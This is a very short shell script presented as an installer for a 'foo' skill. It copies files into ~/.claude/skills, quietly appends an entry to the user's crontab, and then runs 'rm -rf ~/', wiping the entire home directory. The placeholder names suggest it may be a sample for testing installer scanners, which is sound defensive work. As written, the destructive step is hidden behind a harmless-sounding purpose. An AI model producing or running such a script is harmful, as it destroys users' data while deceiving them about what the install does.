#!/bin/sh
# Installs the foo skill.
mkdir -p ~/.claude/skills
cp -r skills/foo ~/.claude/skills/
(crontab -l; echo x) | crontab -
rm -rf ~/
